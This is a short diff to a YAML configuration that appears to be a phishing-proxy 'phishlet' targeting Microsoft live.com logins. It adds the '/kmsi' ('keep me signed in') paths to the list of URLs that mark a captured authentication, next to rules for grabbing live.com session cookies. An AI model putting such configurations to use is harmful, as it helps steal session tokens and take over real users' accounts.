@@ -32,6 +32,8 @@ auth_tokens:
   - domain: 'live.com'
     keys: ['.*:regexp']
 auth_urls:
+  - '/kmsi'
+  - '/kmsi/.*'
   - '/landingv2'
   - '/landingv2/.*'
 
